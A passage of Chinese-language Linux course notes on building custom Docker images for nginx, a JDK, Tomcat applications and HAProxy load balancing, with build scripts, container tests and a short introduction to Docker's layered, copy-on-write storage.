RUN yum install -y gcc gcc-c++ pcre pcre-devel zlib zlib-devel openssl openssl-devel \
   && useradd -r -s /sbin/nologin nginx \
   && yum clean all 
ADD nginx-1.16.1.tar.gz /usr/local/src/ 
RUN cd /usr/local/src/nginx-1.16.1 \
   && ./configure --prefix=/apps/nginx \
   && make \
   && make install \
   && rm -rf /usr/local/src/nginx*
ADD nginx.conf /apps/nginx/conf/nginx.conf
COPY index.html /apps/nginx/html/
RUN ln -s /apps/nginx/sbin/nginx /usr/sbin/nginx 
EXPOSE 80 443
CMD ["nginx","-g","daemon off;"]
```

**生成nginx镜像**

```
[root@ubuntu1804 ~]#cd /data/dockerfile/web/nginx/1.16.1
[root@ubuntu1804 1.16.1]#vim build.sh
[root@ubuntu1804 1.16.1]#cat build.sh
#!/bin/bash
#
docker build -t nginx-centos7:1.6.1-v2 .
[root@ubuntu1804 1.16.1]#chmod +x build.sh
[root@ubuntu1804 1.16.1]#ls
build.sh Dockerfile index.html nginx-1.16.1.tar.gz nginx.conf
[root@ubuntu1804 1.16.1]#./build.sh 
[root@ubuntu1804 1.16.1]#docker images 
REPOSITORY         TAG                 IMAGE ID           CREATED             
SIZE
nginx-centos7       1.6.1-v2           1918d29d5f45        17 minutes ago     
328MB
nginx-centos7       1.6.1               8c16774437a5        13 hours ago       
412MB
centos7-base       v1                 1ba1317e06dc        15 hours ago       
402MB
centos             centos7.7.1908     08d05d1d5859        2 months ago       
204MB
```

**生成容器测试镜像**

```
[root@ubuntu1804 ~]#docker run -d -p 80:80 nginx-centos7:1.6.1-v2 
21c954ad4fb902076832cc9a52dd1502aca43d9bcd2b46a2f164382e4ac7b3f6
[root@ubuntu1804 ~]#docker ps 
CONTAINER ID       IMAGE                   COMMAND                 CREATED   
          STATUS             PORTS                         NAMES
21c954ad4fb9       centos7-nginx:1.6.1-v2   "nginx -g 'daemon of…"   6 seconds 
ago       Up 4 seconds        0.0.0.0:80->80/tcp, 443/tcp   inspiring_goldwasser

[root@ubuntu1804 ~]#curl 127.0.0.1
Test Page v2 in Docker
[root@ubuntu1804 ~]#docker exec -it 21c954ad4fb9 bash

[root@21c954ad4fb9 /]# ps aux
USER       PID %CPU %MEM   VSZ   RSS TTY     STAT START   TIME COMMAND
root          1  0.5  0.2  20572  2372 ?       Ss   03:30   0:00 nginx: master 
process nginx -g daemon off;
nginx         6  0.0  0.2  21024  2316 ?       S    03:30   0:00 nginx: worker 
process
root          7 11.5  0.2  11840  2880 pts/0   Ss   03:31   0:00 bash
root         20  0.0  0.3  51764  3376 pts/0   R+   03:31   0:00 ps aux
[root@21c954ad4fb9 /]# exit
exit
```

###### 48.6.3.4.4 制作自定义tomcat业务镜像

基于官方提供的centos、debian、ubuntu、alpine等基础 镜像构建 JDK (Java环 境)，然后再基于自定义的 JDK 镜像构建出业务需要的tomcat 镜像

**自定义Centos系统基础镜像**

```
#先基于官方提供的基础镜像，制作出安装了常用命令的自定义基础镜像
[root@ubuntu1804 ~]#docker pull centos:centos7.7.1908
[root@ubuntu1804 ~]#mkdir -p /data/dockerfile/{web/{nginx,tomcat,jdk},system/{centos,ubuntu,alpine,debian}} 
[root@ubuntu1804 ~]#cd /data/dockerfile/system/centos/ 

[root@ubuntu1804 centos]#cat Dockerfile  
# Centos Base Image 
FROM centos:centos7.7.1908
LABEL maintainer="liusenbiao <root@liusenbiao.com>"
RUN yum -y install wget && rm -f /etc/yum.repos.d/* && wget -P /etc/yum.repos.d/ http://mirrors.aliyun.com/repo/Centos-7.repo \
   && wget -P /etc/yum.repos.d/ http://mirrors.aliyun.com/repo/epel-7.repo \
   && yum -y install vim-enhanced tcpdump lrzsz tree telnet bash-completion net-tools wget bzip2 lsof zip unzip nfs-utils gcc make gcc-c++ glibc glibcdevel pcre pcre-devel openssl openssl-devel systemd-devel zlib-devel \
   && yum clean all \
   && rm -f /etc/localtime \
   && ln -s ../usr/share/zoneinfo/Asia/Shanghai /etc/localtime
#添加系统账户
RUN groupadd www -g 2019 && useradd www -u 2019 -g www 

[root@ubuntu1804 centos]#vim build.sh

#通过脚本构建镜像
[root@ubuntu1804 centos]#cat build.sh  
#!/bin/bash 
docker build -t centos7-base:v1 . 
[root@ubuntu1804 centos]#bash build.sh 
[root@ubuntu1804 centos]#docker images 
REPOSITORY         TAG                 IMAGE ID           CREATED             
SIZE
centos7-base       v1                 34ab3afcd3b3        4 seconds ago       
403MB
centos             centos7.7.1908     08d05d1d5859        2 months ago       
204MB
```

**构建JDK镜像**

```
#将CentOS7主机上的/etc/profile文件传到 Dockerfile 所在目录下
[root@ubuntu1804 ~]#scp centos7:/etc/profile 10.0.0.100:/data/dockerfile/web/jdk


#修改profile文件，加下面四行相关变量
[root@ubuntu1804 ~]#vim /data/dockerfile/web/jdk/profile
[root@ubuntu1804 ~]#tail -n 5 /data/dockerfile/web/jdk/profile
export JAVA_HOME=/usr/local/jdk
export TOMCAT_HOME=/apps/tomcat
export PATH=$JAVA_HOME/bin:$JAVA_HOME/jre/bin:$TOMCAT_HOME/bin:$PATH
export
CLASSPATH=.$CLASSPATH:$JAVA_HOME/lib:$JAVA_HOME/jre/lib:$JAVA_HOME/lib/tools.jar

#下载jdk文件传到Dockfile目录下
#https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html
[root@ubuntu1804 ~]#tree /data/dockerfile/web/jdk
/data/dockerfile/web/jdk
├── jdk-8u212-linux-x64.tar.gz
└── profile

0 directories, 2 files
```

 **准备Dockerfile文件**

```
[root@ubuntu1804 ~]#vim /data/dockerfile/web/jdk/Dockerfile 
[root@ubuntu1804 ~]#cat /data/dockerfile/web/jdk/Dockerfile
#JDK Base Image
FROM centos7-base:v1
LABEL maintainer="liusenbiao <root@liusenbiao.com>"
ADD jdk-8u212-linux-x64.tar.gz /usr/local/src/
RUN ln -s /usr/local/src/jdk1.8.0_212 /usr/local/jdk
ADD profile /etc/profile
ENV JAVA_HOME /usr/local/jdk
ENV JRE_HOME $JAVA_HOME/jre
ENV CLASSPATH $JAVA_HOME/lib/:$JRE_HOME/lib/
ENV PATH $PATH:$JAVA_HOME/bin
```

**执行构建脚本制作镜像**

```
[root@ubuntu1804 ~]#vim /data/dockerfile/web/jdk/build.sh
[root@ubuntu1804 ~]#cat /data/dockerfile/web/jdk/build.sh
#!/bin/bash
docker build -t centos7-jdk:8u212 .
[root@ubuntu1804 ~]#tree /data/dockerfile/web/jdk/
/data/dockerfile/web/jdk/
├── build.sh
├── Dockerfile
├── jdk-8u212-linux-x64.tar.gz
└── profile

0 directories, 4 files
[root@ubuntu1804 ~]#cd /data/dockerfile/web/jdk/
[root@ubuntu1804 jdk]#bash build.sh

[root@ubuntu1804 jdk]#docker images 
REPOSITORY         TAG                 IMAGE ID           CREATED             
SIZE
centos7-jdk         8u212               fdbeb8a49ea6        59 seconds ago     
809MB
centos7-base       v1                 34ab3afcd3b3        44 minutes ago     
403MB
centos             centos7.7.1908     08d05d1d5859        2 months ago       
204MB


#从镜像启动容器测试
[root@ubuntu1804 jdk]#docker run -it --rm centos7-jdk:8u212 bash
[root@25c9c0266bd2 /]# java -version
java version "1.8.0_212"
Java(TM) SE Runtime Environment (build 1.8.0_212-b10)
Java HotSpot(TM) 64-Bit Server VM (build 25.212-b10, mixed mode)
```

**从JDK镜像构建tomcat 8 Base镜像**

基于自定义的 JDK 基础镜像，构建出通用的自定义 Tomcat 基础镜像，此镜像后期会被多个业务的多个服务共同引用(相同的JDK 版本和Tomcat 版本)

 **上传tomcat 压缩包**

```
[root@ubuntu1804 ~]#mkdir -p /data/dockerfile/web/tomcat/tomcat-base-8.5.50
[root@ubuntu1804 ~]#cd /data/dockerfile/web/tomcat/tomcat-base-8.5.50
[root@ubuntu1804 tomcat-base-8.5.50]#wget http://mirrors.tuna.tsinghua.edu.cn/apache/tomcat/tomcat-8/v8.5.50/bin/apache-tomcat-8.5.50.tar.gz
```

**编辑Dockerfile**

```
[root@ubuntu1804 ~]#cat /data/dockerfile/web/tomcat/tomcat-base-
8.5.50/Dockerfile 
#Tomcat Base Image 
FROM centos7-jdk:8u212 
LABEL maintainer="liusenbiao <root@liusenbiao.com>"
#env 
ENV TZ "Asia/Shanghai"
ENV LANG en_US.UTF-8 
ENV TERM xterm 
ENV TOMCAT_MAJOR_VERSION 8
ENV TOMCAT_MINOR_VERSION 8.5.50 
ENV CATALINA_HOME /apps/tomcat 
ENV APP_DIR ${CATALINA_HOME}/webapps 
RUN mkdir /apps  
ADD apache-tomcat-8.5.50.tar.gz /apps   
RUN ln -s /apps/apache-tomcat-8.5.50 /apps/tomcat
```

  **通过脚本构建tomcat 基础镜像**

```
[root@ubuntu1804 tomcat-base-8.5.50]#cat build.sh 
#!/bin/bash
docker build -t tomcat-base:v8.5.50 .
[root@ubuntu1804 tomcat-base-8.5.50]#tree
.
├── apache-tomcat-8.5.50.tar.gz
├── build.sh
└── Dockerfile

0 directories, 3 files

[root@ubuntu1804 tomcat-base-8.5.50]#docker images
REPOSITORY         TAG                 IMAGE ID           CREATED             
SIZE
tomcat-base         v8.5.50             8d5395cb72c4        3 seconds ago       
824MB
centos7-jdk         8u212               e0fe770a7ccd        22 minutes ago     
809MB
centos7-base       v1                 34ab3afcd3b3          2 hours ago         
403MB
centos             centos7.7.1908     08d05d1d5859          2 months ago       
204MB
```

**验证镜像构建完成**

```
[root@ubuntu1804 tomcat-base-8.5.50]#docker run -it --rm -p 8080:8080 tomcat-base:v8.5.50 bash  

[root@d0a387e0ccc9 /]# /apps/tomcat/bin/catalina.sh start
Using CATALINA_BASE:   /apps/tomcat
Using CATALINA_HOME:   /apps/tomcat
Using CATALINA_TMPDIR: /apps/tomcat/temp
Using JRE_HOME:       /usr/local/jdk/jre
Using CLASSPATH:       /apps/tomcat/bin/bootstrap.jar:/apps/tomcat/bin/tomcat-juli.jar
Tomcat started.

[root@d0a387e0ccc9 /]# netstat -ntl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:8009            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN    
```

**构建业务镜像1**

```
#创建tomcat-app1和tomcat-app2两个目录，代表不同的两个基于tomcat的业务。
#准备tomcat的配置文件
[root@ubuntu1804 ~]#mkdir -p /data/dockerfile/web/tomcat/tomcat-app{1,2}
[root@ubuntu1804 ~]#tree /data/dockerfile/web/tomcat/
/data/dockerfile/web/tomcat/
├── tomcat-app1
├── tomcat-app2
└── tomcat-base-8.5.50
   ├── apache-tomcat-8.5.50.tar.g
   ├── build.sh
   └── Dockerfile
   
3 directories, 3 files


#上传和修改server.xml 
[root@ubuntu1804 ~]#cd /data/dockerfile/web/tomcat/tomcat-base-8.5.50
[root@ubuntu1804 tomcat-base-8.5.50]#tar xf apache-tomcat-8.5.50.tar.gz
[root@ubuntu1804 tomcat-base-8.5.50]#cp apache-tomcat-8.5.50/conf/server.xml 
/data/dockerfile/web/tomcat/tomcat-app1/
[root@ubuntu1804 tomcat-base-8.5.50]#cd /data/dockerfile/web/tomcat/tomcat-app1/
[root@ubuntu1804 tomcat-app1]#vim server.xml
......
 <Host name="localhost"  appBase="/data/tomcat/webapps"                         
    
            unpackWARs="true" autoDeploy="true">
......
```

**准备自定义页面**

```
[root@ubuntu1804 tomcat-app1]#mkdir app
[root@ubuntu1804 tomcat-app1]#echo "Tomcat Page in app1" > app/index.jsp
[root@ubuntu1804 tomcat-app1]#tar zcf app.tar.gz app
```

**准备容器启动执行脚本**

```
[root@ubuntu1804 tomcat-app1]#vim run_tomcat.sh
[root@ubuntu1804 tomcat-app1]#cat run_tomcat.sh
#!/bin/bash
echo "nameserver 180.76.76.76" > /etc/resolv.conf 
su - www -c "/apps/tomcat/bin/catalina.sh start"
su - www -c "tail -f /etc/hosts"
[root@ubuntu1804 tomcat-app1]#chmod a+x run_tomcat.sh
```

**准备Dockerfile**

```
[root@ubuntu1804 tomcat-app1]#vim Dockerfile
[root@ubuntu1804 tomcat-app1]#cat Dockerfile 
#Tomcat Web Image 
FROM tomcat-base:v8.5.50
LABEL maintainer="liusenbiao <root@liusenbiao.com>"
ADD server.xml /apps/tomcat/conf/server.xml
ADD run_tomcat.sh /apps/tomcat/bin/run_tomcat.sh 
ADD app.tar.gz /data/tomcat/webapps/ 
RUN chown -R www.www /apps/   /data/tomcat/   
EXPOSE 8080  8009
CMD ["/apps/tomcat/bin/run_tomcat.sh"]
```

**执行构建脚本制作镜像**

```
[root@ubuntu1804 tomcat-app1]#cat build.sh
#!/bin/bash
docker build -t tomcat-web:app1 .


[root@ubuntu1804 tomcat-app1]#pwd
/data/dockerfile/web/tomcat/tomcat-app1
[root@ubuntu1804 tomcat-app1]#tree
.
├── app
│   └── index.jsp
├── app.tar.gz
├── build.sh
├── Dockerfile
├── run_tomcat.sh
└── server.xml

1 directory, 6 files
[root@ubuntu1804 tomcat-app1]#bash build.sh 


[root@ubuntu1804 tomcat-app1]#docker images
REPOSITORY         TAG                 IMAGE ID           CREATED             
SIZE
tomcat-web         app1               3e9eacc5ef86        4 seconds ago       
824MB
tomcat-base         v8.5.50             8d5395cb72c4        35 minutes ago     
824MB
centos7-jdk         8u212               e0fe770a7ccd        57 minutes ago     
809MB
centos7-base       v1                 34ab3afcd3b3        2 hours ago         
403MB
centos             centos7.7.1908     08d05d1d5859        2 months ago       
204MB



#从镜像启动测试容器
[root@ubuntu1804 tomcat-app1]#docker run -d -p 8080:8080 tomcat-web:app1
82e6690e36c3a6faf2dae62bd706a89cbba490d567c841c37501f0fba670ea25
```

**访问测试**

```
[root@ubuntu1804 ~]#curl 127.0.0.1:8080/app/
Tomcat Page in app1
[root@ubuntu1804 ~]#docker exec -it 82e6690e36c3 bash


[root@82e6690e36c3 /]# ps aux
USER       PID %CPU %MEM   VSZ   RSS TTY     STAT START   TIME COMMAND
root          1  0.0  0.2  15136  2248 ?       Ss   22:14   0:00 /bin/bash 
/apps/tomcat/bin/run_tomcat.sh
www          25  0.8  9.7 2241656 95924 ?       Sl   22:14   0:04 
/usr/local/jdk/bin/java -Djava.util.logging.config.file=/apps/tomcat
root         26  0.0  0.4  85428  4472 ?       S    22:14   0:00 su - www -c
tail -f /etc/hosts
www          27  0.0  0.0   4416   720 ?       Ss   22:14   0:00 tail -f
/etc/hosts
root         82 25.0  0.3  15800  3820 pts/0   Ss   22:22   0:00 bash
root        101  0.0  0.3  55196  3836 pts/0   R+   22:22   0:00 ps aux


[root@82e6690e36c3 /]# vim /data/tomcat/webapps/app/index.jsp 
[root@82e6690e36c3 /]# cat /data/tomcat/webapps/app/index.jsp
Tomcat Page in app1 v2
[root@82e6690e36c3 /]# /apps/tomcat/bin/catalina.sh stop
Using CATALINA_BASE:   /apps/tomcat
Using CATALINA_HOME:   /apps/tomcat
Using CATALINA_TMPDIR: /apps/tomcat/temp
Using JRE_HOME:       /usr/local/jdk/jre
Using CLASSPATH:       /apps/tomcat/bin/bootstrap.jar:/apps/tomcat/bin/tomca-juli.jar


[root@82e6690e36c3 /]# /apps/tomcat/bin/catalina.sh start
Using CATALINA_BASE:   /apps/tomcat
Using CATALINA_HOME:   /apps/tomcat
Using CATALINA_TMPDIR: /apps/tomcat/temp
Using JRE_HOME:       /usr/local/jdk/jre
Using CLASSPATH:       /apps/tomcat/bin/bootstrap.jar:/apps/tomcat/bin/tomcat-juli.jar
Tomcat started.


[root@ubuntu1804 tomcat-app1]#curl 127.0.0.1:8080/app/
Tomcat Page in app1 v2
```

**构建业务镜像2**

```
#准备自定义页面和其它数据
[root@ubuntu1804 tomcat]#pwd
/data/dockerfile/web/tomcat
[root@ubuntu1804 tomcat]#cp -a tomcat-app1/* tomcat-app2/
[root@ubuntu1804 tomcat]#tree tomcat-app2/
tomcat-app2/
├── app
│   └── index.jsp
├── app.tar.gz
├── build.sh
├── Dockerfile
├── run_tomcat.sh
└── server.xml

1 directory, 6 files
[root@ubuntu1804 tomcat]#cd tomcat-app2
[root@ubuntu1804 tomcat-app2]#echo "Tomcat Page in app2" > app/index.html
[root@ubuntu1804 tomcat-app2]#rm -f app.tar.gz 
[root@ubuntu1804 tomcat-app2]#tar zcf app.tar.gz app
```

**准备容器启动脚本run_tomcat.sh**

和业务1一样不变

**准备Dockerfile**

和业务1一样不变

**执行构建脚本制作镜像**

```
[root@ubuntu1804 tomcat-app2]#vim build.sh
[root@ubuntu1804 tomcat-app2]#cat build.sh
#!/bin/bash
docker build -t tomcat-web:app2 .
[root@ubuntu1804 tomcat-app2]#bash build.sh
[root@ubuntu1804 tomcat-app2]#docker images 
REPOSITORY         TAG                 IMAGE ID           CREATED             
SIZE
tomcat-web         app2               0e1760fe79a6        37 seconds ago     
838MB
tomcat-web         app1               76016219a0ca        27 minutes ago     
838MB
tomcat-base         v8.5.50             8d5395cb72c4        2 hours ago         
824MB
centos7-jdk         8u212               e0fe770a7ccd        2 hours ago         
809MB
centos7-base       v1                 34ab3afcd3b3        3 hours ago         
403MB
centos             centos7.7.1908     08d05d1d5859        2 months ago       
204MB
```

**从镜像启动容器测试**

```
[root@ubuntu1804 tomcat-app2]#docker run -d -p 8082:8080 tomcat-web:app2
3fc9437e42099e92f88e8e09bac0507f2d837ac8a6dba8cb1e4efc934bcf81ff
```

**访问测试**

```
[root@ubuntu1804 tomcat-app2]#curl 127.0.0.1:8082/app/
Tomcat Page in app2
```

###### 48.6.3.4.5 构建haproxy镜像

**准备相关文件**

```
#准备haproxy源码文件
[root@ubuntu1804 ~]#mkdir -p /data/dockerfile/web/haproxy/2.1.2-centos7 
[root@ubuntu1804 ~]#cd /data/dockerfile/web/haproxy/2.1.2-centos7
[root@ubuntu1804 2.1.2-centos7]#wget http://www.haproxy.org/download/2.1/src/haproxy-2.1.2.tar.gz



#准备haproxy启动脚本
[root@ubuntu1804 2.1.2-centos7]#vim run_haproxy.sh
[root@ubuntu1804 2.1.2-centos7]#cat run_haproxy.sh
#!/bin/bash
haproxy -f /etc/haproxy/haproxy.cfg
tail -f /etc/hosts
```

**准备haproxy配置文件**

```
#准备haproxy配置文件
[root@ubuntu1804 2.1.2-centos7]#cat haproxy.cfg 
global
chroot /apps/haproxy
#stats socket /var/lib/haproxy/haproxy.sock mode 600 level admin
uid 99
gid 99
daemon
nbproc 1
pidfile /apps/haproxy/run/haproxy.pid
log 127.0.0.1 local3 info
defaults
option http-keep-alive
option forwardfor
mode http
timeout connect 300000ms
timeout client 300000ms
timeout server 300000ms
listen stats
 mode http
 bind 0.0.0.0:9999
 stats enable
 log global
 stats uri   /haproxy-status
 stats auth haadmin:123456 
 
 
listen web_port
 bind 0.0.0.0:80
 mode http
 log global
 balance roundrobin
 server web1 10.0.0.101:8080 check inter 3000 fall 2 rise 5
 server web2 10.0.0.102:8080 check inter 3000 fall 2 rise 5
```

**准备Dockerfile**

```
[root@ubuntu1804 2.1.2-centos7]#pwd
/data/dockerfile/web/haproxy/2.1.2-centos7


[root@ubuntu1804 haproxy]# cat Dockerfile 
#Haproxy Base Image
FROM centos7-base:v1
LABEL maintainer="wangxiaochun <root@wangxiaochun.com>"
ADD haproxy-2.1.2.tar.gz /usr/local/src/ 
RUN cd /usr/local/src/haproxy-2.1.2 \
   && make ARCH=x86_64 TARGET=linux-glibc USE_PCRE=1 USE_OPENSSL=1 USE_ZLIB=1
USE_SYSTEMD=1 USE_CPU_AFFINITY=1 PREFIX=/apps/haproxy \
   && make install PREFIX=/apps/haproxy \
   && ln -s /apps/haproxy/sbin/haproxy /usr/sbin/ \
   && mkdir /apps/haproxy/run \
   && rm -rf /usr/local/src/haproxy*  
ADD haproxy.cfg /etc/haproxy/
ADD run_haproxy.sh /usr/bin
EXPOSE 80 9999
CMD ["run_haproxy.sh"]
```

**准备构建脚本构建haproxy镜像**

```
[root@ubuntu1804 2.1.2-centos7]#vim build.sh 
[root@ubuntu1804 2.1.2-centos7]#cat build.sh 
#!/bin/bash
docker build -t haproxy-centos7:2.1.2 .
[root@ubuntu1804 2.1.2-centos7]#ls
build.sh Dockerfile haproxy-2.1.2.tar.gz haproxy.cfg run_haproxy.sh
[root@ubuntu1804 2.1.2-centos7]#bash build.sh 
[root@ubuntu1804 2.1.2-centos7]#docker images 
REPOSITORY         TAG                 IMAGE ID           CREATED             
SIZE
haproxy-centos7     2.1.2               5eccdb29a058        26 minutes ago     
428MB
nginx-ubuntu1804    1.16.1             19efdd23ac87        15 hours ago       
378MB
alpine-nginx        1.16.1             978a43bbb61d        16 hours ago       
211MB
nginx-alpine        1.16.1             978a43bbb61d        16 hours ago       
211MB
alpine-base         3.11               b162eecf4da9        17 hours ago       
182MB
tomcat-web         app2               0e1760fe79a6        37 hours ago       
838MB
tomcat-web         app1               76016219a0ca        37 hours ago       
838MB
tomcat-base         v8.5.50             8d5395cb72c4        38 hours ago       
824MB
centos7-jdk         8u212               e0fe770a7ccd        39 hours ago       
809MB
centos7-base       v1                 34ab3afcd3b3        40 hours ago       
403MB
alpine              3.11               e7d92cdc71fe        12 days ago         
5.59MB
alpine             latest             e7d92cdc71fe        12 days ago         
5.59MB
ubuntu              18.04               ccc6e87d482b        2 weeks ago         
64.2MB
ubuntu             bionic             ccc6e87d482b        2 weeks ago         
64.2MB
centos             centos7.7.1908     08d05d1d5859        2 months ago       
204MB
```

**从镜像启动容器**

```
[root@ubuntu1804 2.1.2-centos7]#docker run -d -p 80:80 -p 9999:9999 haproxy-centos7:2.1.2 
e0a7c827cb5fdd5a630f7dfe58b1f60822da18929a4dfeccb7490fb78403e3df
```

**在另外两台主机启动容器**

```
#导出本地相关镜像
[root@ubuntu1804 ~]#docker save centos7-base:v1 > /data/centos7-base.tar.gz
[root@ubuntu1804 ~]#docker save centos7-jdk:8u212 > /data/centos7-jdk.tar.gz
[root@ubuntu1804 ~]#docker save tomcat-base:v8.5.50 > /data/tomcat-base.tar.gz
[root@ubuntu1804 ~]#docker save tomcat-web:app1 > /data/tomcat-web-app1.tar.gz
[root@ubuntu1804 ~]#docker save tomcat-web:app2 > /data/tomcat-web-app2.tar.gz
[root@ubuntu1804 ~]#ls /data
centos7-base.tar.gz centos7-jdk.tar.gz dockerfile tomcat-base.tar.gz tomcatweb-app1.tar.gz tomcat-web-app2.tar.gz


#将镜像复制到另外两台主机
[root@ubuntu1804 ~]#scp /data/*.gz 10.0.0.101:/data/
[root@ubuntu1804 ~]#scp /data/*.gz 10.0.0.102:/data/


#在另外两台主机上执行下面操作导入镜像
[root@ubuntu1804 ~]#ls /data
centos7-base.tar.gz lost+found         tomcat-web-app1.tar.gz
centos7-jdk.tar.gz   tomcat-base.tar.gz tomcat-web-app2.tar.gz
[root@ubuntu1804 ~]#for i in /data/*.gz;do docker load -i $i;done


#在另外两台主机上创建相关容器
[root@ubuntu1804 ~]#docker run -d -p 8080:8080 tomcat-web:app1 
781681e73333396b23f404e70d0c781ab464a8e9b578f41c153583d23bd76a46
[root@ubuntu1804 ~]#docker run -d -p 8080:8080 tomcat-web:app2
81fa01a688cb72cf397a5da46acc89a51f2a2f8de3a0072565d701625c43540a
```

**web访问验证**

```
[root@ubuntu1804 2.1.2-centos7]#curl http://10.0.0.100/app/
Tomcat Page in app1
[root@ubuntu1804 2.1.2-centos7]#curl http://10.0.0.100/app/
Tomcat Page in app2
[root@ubuntu1804 2.1.2-centos7]#docker exec -it e0a7c827cb5 bash
[root@e0a7c827cb5f /]# netstat -ntl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:9999            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
[root@e0a7c827cb5f /]# vim /etc/haproxy/haproxy.cfg 
[root@e0a7c827cb5f /]# ps aux
USER       PID %CPU %MEM   VSZ   RSS TTY     STAT START   TIME COMMAND
root          1  0.0  0.2  11700  2428 ?       Ss   11:01   0:00 /bin/bash 
/usr/bin/run_haproxy.sh
nobody        7  0.0  7.1 181076 70324 ?       Ss   11:01   0:00 haproxy -f
/etc/haproxy/haproxy.cfg
root          8  0.0  0.0   4416   772 ?       S    11:01   0:00 tail -f
/etc/hosts
root          9  0.1  0.3  12488  3696 pts/0   Ss   11:02   0:00 bash
root         54  0.0  0.3  51764  3448 pts/0   R+   11:06   0:00 ps aux
```

![1659927476248](linux体系.assets/1659927537768.png)

```
#在第二台主机上停止容器
[root@ubuntu1804 ~]#docker stop 81fa01a688cb
[root@ubuntu1804 ~]#docker ps -a
CONTAINER ID       IMAGE               COMMAND                 CREATED         
    STATUS                       PORTS               NAMES
81fa01a688cb       tomcat-web:app2     "/apps/tomcat/bin/ru…"   28 minutes ago 
    Exited (137) 39 seconds ago 
#观察状态页，发现后端服务器down
```

![1659927508680](linux体系.assets/1659927508680.png)

```
#在第二台主机上恢复启动容器
[root@ubuntu1804 ~]#docker start 81fa01a688cb
81fa01a688cb
[root@ubuntu1804 ~]#docker ps -a
CONTAINER ID       IMAGE               COMMAND                 CREATED         
    STATUS             PORTS                             NAMES
81fa01a688cb       tomcat-web:app2     "/apps/tomcat/bin/ru…"   30 minutes ago 
    Up 14 seconds       8009/tcp, 0.0.0.0:8080->8080/tcp   optimistic_shirley
#再次观察状态页，发现后端服务器上线
```

###### 48.6.3.4.6 基于Ubuntu镜像制作nginx镜像

```
#下载ubuntu1804镜像
[root@ubuntu1804 ~]#docker pull ubuntu:18.04
[root@ubuntu1804 ~]#docker images ubuntu*
REPOSITORY         TAG                 IMAGE ID           CREATED             
SIZE
ubuntu              18.04               ccc6e87d482b        13 days ago         
64.2MB


#准备相关文件
[root@ubuntu1804 ~]#mkdir /data/dockerfile/web/nginx/1.16.1-ubuntu1804
[root@ubuntu1804 ~]#cd /data/dockerfile/web/nginx/1.16.1-ubuntu1804
[root@ubuntu1804 1.16.1-ubuntu1804]#vim sources.list
[root@ubuntu1804 1.16.1-ubuntu1804]#cat sources.list
deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe 
multiverse
deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe 
multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted 
universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe 
multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted 
universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe 
multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted 
universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe 
multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted 
universe multiverse



[root@ubuntu1804 1.16.1-ubuntu1804]#wget http://nginx.org/download/nginx-1.16.1.tar.gz
[root@ubuntu1804 1.16.1-ubuntu1804]#cp ../1.16.1-alpine/nginx.conf .
[root@ubuntu1804 1.16.1-ubuntu1804]#echo Test Page based nginx-ubuntu1804 > index.html



#编写Dockerfile文件
[root@ubuntu1804 1.16.1-ubuntu1804]#vim Dockerfile
[root@ubuntu1804 1.16.1-ubuntu1804]#cat Dockerfile 
FROM ubuntu:18.04 
LABEL maintainer="liusenbiao <root@liusenbiao.com>"
COPY sources.list /etc/apt/sources.list 
RUN apt update && apt install -y nfs-kernel-server nfs-common  gcc opensshserver lrzsz tree  openssl libssl-dev libpcre3 libpcre3-dev zlib1g-dev   unzip 
zip make
ADD nginx-1.16.1.tar.gz /usr/local/src 
RUN cd /usr/local/src/nginx-1.16.1 && ./configure --prefix=/apps/nginx && make
&& make install && ln -s /apps/nginx/sbin/nginx /usr/bin && rm  -rf
/usr/local/src/nginx-1.16.1*
ADD nginx.conf /apps/nginx/conf/nginx.conf
ADD index.html /data/nginx/html/index.html
RUN groupadd  -g 2019 nginx && useradd  -g nginx -s /usr/sbin/nologin -u 2019
nginx && chown -R nginx.nginx /apps/nginx /data/nginx 
EXPOSE 80 443
CMD ["nginx"] 


#构建镜像
[root@ubuntu1804 1.16.1-ubuntu1804]#vim build.sh
[root@ubuntu1804 1.16.1-ubuntu1804]#cat build.sh
#!/bin/bash
docker build -t nginx-ubuntu1804:1.16.1 .
[root@ubuntu1804 1.16.1-ubuntu1804]#ls
build.sh Dockerfile index.html nginx-1.16.1.tar.gz nginx.conf sources.list
[root@ubuntu1804 1.16.1-ubuntu1804]#docker images "nginx*"
REPOSITORY         TAG                 IMAGE ID           CREATED             
SIZE
nginx-ubuntu1804    1.16.1             19efdd23ac87        4 minutes ago       
378MB
nginx-alpine        1.16.1             978a43bbb61d        40 minutes ago     
211MB
nginx-centos7       1.6.1-v2           1918d29d5f45        17 minutes ago     
328MB
nginx-centos7       1.6.1               8c16774437a5        13 hours ago       
412MB 



#启动容器测试镜像
[root@ubuntu1804 1.16.1-ubuntu1804]#docker run -d -p 80:80 nginxubuntu1804:1.16.1 
58f8e9a8fd6eebb19bd2b7c27bd8d52a3a4d42637a942e1e9179ec1b2bcc559d
[root@ubuntu1804 1.16.1-ubuntu1804]#curl 127.0.0.1
Test Page based nginx-ubuntu1804
```

### 48.7 Docker数据管理

#### 48.7.1 容器的数据管理介绍

```
Docker镜像是分层设计的，镜像层是只读的，通过镜像启动的容器添加了一层可读写的文件系统，用户写入的数据都保存在这一层中。
```

![1659930671606](linux体系.assets/1659930671606.png)

```
Docker镜像由多个只读层叠加而成，启动容器时，Docker会加载只读镜像层并在镜像栈顶部添加一个读写层。

如果运行中的容器修改了现有的一个已经存在的文件，那该文件将会从读写层下面的只读层复制到读写层，该文件的只读版本仍然存在，只是已经被读写层中该文件的副本所隐藏，此即“写时复制(COW copy on write)"机制。

